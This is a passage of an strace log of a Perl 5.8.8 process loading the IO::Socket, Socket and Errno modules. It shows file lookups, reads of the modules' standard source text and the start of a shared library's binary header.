@_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
19001 12:57:07.413009 stat64("/etc/perl/Socket.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413025 stat64("/etc/perl/Socket.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413039 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413052 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413066 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413082 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413097 stat64("/usr/lib/perl5/Socket.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413109 stat64("/usr/lib/perl5/Socket.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413122 stat64("/usr/share/perl5/Socket.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413134 stat64("/usr/share/perl5/Socket.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413147 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.413160 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
19001 12:57:07.413181 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.413197 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.413197 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.413197 read(9, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
19001 12:57:07.413629 brk(0x8239000)    = 0x8239000
19001 12:57:07.413838 read(9, "", 4096) = 0
19001 12:57:07.413854 close(9)          = 0
19001 12:57:07.413943 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
19001 12:57:07.413968 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
19001 12:57:07.413997 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 9
19001 12:57:07.414012 read(9, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
19001 12:57:07.414149 fstat64(9, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
19001 12:57:07.414169 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 9, 0) = 0xb7cf0000
19001 12:57:07.414184 mmap2(0xb7cf5000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 9, 0x4) = 0xb7cf5000
19001 12:57:07.414200 close(9)          = 0
19001 12:57:07.414795 brk(0x825a000)    = 0x825a000
19001 12:57:07.414945 stat64("/etc/perl/Errno.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.414962 stat64("/etc/perl/Errno.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.414976 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.414988 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415003 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415016 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415030 stat64("/usr/lib/perl5/Errno.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415072 stat64("/usr/lib/perl5/Errno.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415087 stat64("/usr/share/perl5/Errno.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415113 stat64("/usr/share/perl5/Errno.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415126 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.415143 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
19001 12:57:07.415165 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.415180 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.415192 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.415212 read(9, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
19001 12:57:07.415987 read(9, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
19001 12:57:07.416435 _llseek(9, 5966, [5966], SEEK_SET) = 0
19001 12:57:07.416452 _llseek(9, 0, [5966], SEEK_CUR) = 0
19001 12:57:07.416462 close(9)          = 0
19001 12:57:07.416844 brk(0x827b000)    = 0x827b000
19001 12:57:07.416971 read(7, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
19001 12:57:07.417468 _llseek(7, 6698, [6698], SEEK_SET) = 0
19001 12:57:07.417484 _llseek(7, 0, [6698], SEEK_CUR) = 0
19001 12:57:07.417494 close(7)          = 0
19001 12:57:07.417513 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418243 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418284 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418312 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
